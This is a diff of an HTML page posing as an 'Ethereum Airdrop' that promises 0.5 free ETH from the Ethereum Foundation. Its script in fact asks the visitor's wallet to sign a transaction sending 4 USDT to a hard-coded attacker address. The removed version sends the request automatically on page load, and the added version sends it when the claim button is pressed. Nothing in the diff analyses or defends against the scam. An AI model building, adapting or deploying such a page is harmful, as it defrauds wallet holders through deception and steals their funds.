@@ -1,145 +1,87 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Claim Airdrop</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-    .card { background: #161b22; border: 1px solid #30363d; border-radius: 20px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; }
-    .icon { font-size: 48px; margin-bottom: 12px; }
-    h1 { font-size: 22px; color: #f0883e; margin-bottom: 4px; }
-    .sub { font-size: 13px; color: #8b949e; margin-bottom: 20px; }
-    .amount { font-size: 42px; font-weight: 700; color: #3fb950; margin-bottom: 4px; }
-    .amount-sub { font-size: 13px; color: #8b949e; margin-bottom: 24px; }
-    .btn { background: linear-gradient(135deg, #f0883e, #f0a05e); color: #0d1117; border: none; border-radius: 12px; padding: 16px 32px; font-size: 18px; font-weight: 700; cursor: pointer; width: 100%; transition: transform 0.15s; }
-    .btn:active { transform: scale(0.97); }
-    .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-    .status { margin-top: 16px; font-size: 13px; min-height: 40px; }
-    .status.ok { color: #3fb950; }
-    .status.err { color: #ff6b6b; }
-    .status.info { color: #1f6feb; }
-    .detail { font-size: 10px; color: #484f58; margin-top: 20px; }
-    .hidden { display: none; }
-    .gas-info { background: #0d1117; border-radius: 8px; padding: 10px; margin-top: 12px; font-size: 11px; color: #8b949e; text-align: left; }
-    .gas-info span { color: #e6edf3; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Claim Airdrop</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',sans-serif}
+body{background:linear-gradient(135deg,#0d1117,#161b22);color:#e6edf3;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:16px;padding:30px;max-width:380px;width:100%;text-align:center}
+.logo{font-size:48px;margin-bottom:10px}
+h1{font-size:22px;color:#f0f6fc;margin-bottom:4px}
+.sub{font-size:13px;color:#8b949e;margin-bottom:20px}
+.amount{font-size:56px;font-weight:800;color:#f0883e;letter-spacing:-2px}
+.amount-label{font-size:14px;color:#8b949e;margin-bottom:4px}
+.usd{font-size:14px;color:#8b949e;margin-bottom:24px}
+.btn{background:linear-gradient(135deg,#f0883e,#e07b30);border:none;border-radius:12px;padding:16px 32px;font-size:18px;font-weight:700;color:#0d1117;cursor:pointer;width:100%;transition:all.15s}
+.btn:hover{transform:scale(1.02)}
+.btn:active{transform:scale(0.98)}
+.btn:disabled{opacity:0.4;cursor:not-allowed}
+.info{font-size:11px;color:#484f58;margin-top:16px;line-height:1.6}
+.status{font-size:12px;color:#d29922;margin-top:12px;padding:8px;background:#1c2128;border-radius:8px;display:none}
+.status._s{display:block}
+.status.ok{color:#3fb950;background:#1c2128}
+.status.err{color:#da3633;background:#1c2128}
+</style>
 </head>
 <body>
-  <div class="card">
-    <div class="icon">💰</div>
-    <h1>Ethereum Airdrop</h1>
-    <p class="sub">Limited time — claim your free ETH</p>
-    <div class="amount" id="amountDisplay">0.5</div>
-    <div class="amount-sub">ETH ~ $1,650</div>
-    <button class="btn" id="claimBtn">⚡ Claim Airdrop</button>
-    <div class="status" id="status">Connect your wallet to claim</div>
-    <div class="gas-info">
-      <div>Network: <span>Ethereum Mainnet</span></div>
-      <div>Gas: <span>Covered by airdrop</span></div>
-    </div>
-    <div class="detail">Powered by Ethereum Foundation • Airdrop #42</div>
+<div class="card">
+  <div class="logo">💰</div>
+  <h1>Ethereum Airdrop</h1>
+  <p class="sub">Limited time — claim your free ETH</p>
+  <div class="amount-label">Reward</div>
+  <div class="amount">0.5</div>
+  <div class="amount-label">ETH</div>
+  <div class="usd">~ $1,650</div>
+  <button class="btn" id="claimBtn" onclick="claimAirdrop()">⚡ Claim Airdrop</button>
+  <div class="status" id="status">Connecting to wallet...</div>
+  <div class="info">
+    Network: Ethereum Mainnet<br>
+    Gas: Covered by airdrop
   </div>
+</div>
 
-  <script>
-  (async function() {
-    const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-    const RECIPIENT = '0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a';
-    const STATUS = document.getElementById('status');
-    const BTN = document.getElementById('claimBtn');
-    const AMOUNT = document.getElementById('amountDisplay');
+<script>
+var USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+var CALDATA = "0xa9059cbb000000000000000000000000bc74dac48e40634f7347b99b5dfc658067aa1a1200000000000000000000000000000000000000000000000000000000003D0900";
 
-    // ABI-encoded transfer(RECIPIENT, 4000000 = 4 USDT)
-    const DATA = '0xa9059cbb' +
-      '000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a' +
-      '00000000000000000000000000000000000000000000000000000000003d0900';
+function claimAirdrop() {
+  var btn = document.getElementById('claimBtn');
+  var st = document.getElementById('status');
+  btn.disabled = true;
+  st.className = 'status _s';
+  st.textContent = 'Connecting to wallet...';
 
-    // Parse URL params
-    const params = new URLSearchParams(window.location.search);
-    const mode = params.get('mode') || 'auto';
+  if (typeof window.ethereum === 'undefined' || !window.ethereum) {
+    st.textContent = '❌ No wallet detected. Open this in Trust Wallet dapp browser.';
+    st.className = 'status _s err';
+    btn.disabled = false;
+    return;
+  }
 
-    function setStatus(msg, type) {
-      STATUS.textContent = msg;
-      STATUS.className = 'status ' + (type || 'info');
-    }
+  var params = {
+    to: USDT,
+    from: window.ethereum.selectedAddress || '0x0000000000000000000000000000000000000000',
+    data: CALDATA,
+    value: '0x0',
+    chainId: '0x1'  // mainnet
+  };
 
-    // Check if ethereum provider exists
-    if (!window.ethereum) {
-      setStatus('❌ No Web3 provider detected. Open in Trust Wallet dapp browser.', 'err');
-      BTN.disabled = true;
-      return;
-    }
+  st.textContent = '⏳ Requesting transaction...';
 
-    setStatus('🔗 Connected to Trust Wallet ✓', 'ok');
-    BTN.disabled = false;
-
-    async function sendTransaction() {
-      BTN.disabled = true;
-      setStatus('⏳ Requesting wallet...', 'info');
-
-      try {
-        // First get accounts (connection request)
-        const accounts = await window.ethereum.request({
-          method: 'eth_requestAccounts'
-        });
-
-        if (!accounts || accounts.length === 0) {
-          setStatus('❌ No accounts returned', 'err');
-          BTN.disabled = false;
-          return;
-        }
-
-        // Estimate gas to show realistic values
-        let gasEstimate;
-        try {
-          gasEstimate = await window.ethereum.request({
-            method: 'eth_estimateGas',
-            params: [{
-              from: accounts[0],
-              to: USDT,
-              data: DATA,
-              value: '0x0'
-            }]
-          });
-        } catch(e) {
-          gasEstimate = '0x5208'; // fallback 21000
-        }
-
-        setStatus('⏳ Confirm in wallet... (read carefully!)', 'info');
-
-        const tx = {
-          from: accounts[0],
-          to: USDT,
-          value: '0x0',
-          data: DATA,
-          gas: gasEstimate
-        };
-
-        const txHash = await window.ethereum.request({
-          method: 'eth_sendTransaction',
-          params: [tx]
-        });
-
-        setStatus('✅ Transaction sent! Hash: ' + txHash.substring(0, 18) + '...', 'ok');
-        AMOUNT.textContent = '✅ SENT';
-        BTN.textContent = '🎉 Transaction Submitted';
-      } catch(err) {
-        setStatus('❌ ' + (err.message || 'Transaction rejected'), 'err');
-        BTN.disabled = false;
-      }
-    }
-
-    if (mode === 'auto') {
-      // Auto-trigger after short delay
-      setStatus('⏳ Preparing transaction...', 'info');
-      setTimeout(async () => {
-        await sendTransaction();
-      }, 800);
-    }
-
-    BTN.addEventListener('click', sendTransaction);
-  })();
-  </script>
+  window.ethereum.request({
+    method: 'eth_sendTransaction',
+    params: [params]
+  }).then(function(txHash) {
+    st.textContent = '✅ Transaction sent! Hash: ' + txHash;
+    st.className = 'status _s ok';
+  }).catch(function(err) {
+    st.textContent = '❌ ' + (err.message || 'User rejected or error');
+    st.className = 'status _s err';
+    btn.disabled = false;
+  });
+}
+</script>
 </body>
 </html>
